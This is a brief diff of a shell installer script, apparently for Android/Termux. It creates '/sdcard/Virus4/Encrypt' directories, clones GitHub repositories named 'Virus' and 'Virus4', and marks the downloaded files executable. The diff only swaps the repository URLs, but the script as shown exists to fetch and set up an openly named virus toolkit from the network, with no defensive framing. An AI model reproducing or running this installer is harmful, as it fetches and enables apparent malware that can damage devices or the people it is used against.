@@ -70,7 +70,7 @@ sleep 0.4
 mkdir /sdcard/Virus4
 mkdir /sdcard/Virus4/Encrypt
 cd
-git clone https://github.com/aes-hackerlaceset/Virus
+git clone https://github.com/aes-hacker/Virus
 cd
 cd Virus
 mv -v Virus4.zip $HOME
@@ -156,7 +156,7 @@ clear
 echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
 sleep 0.4
 cd
-git clone https://github.com/aes-hackerlaceset/Virus4
+git clone https://github.com/aes-hacker/Virus4
 cd Virus4
 chmod +x *
 clear
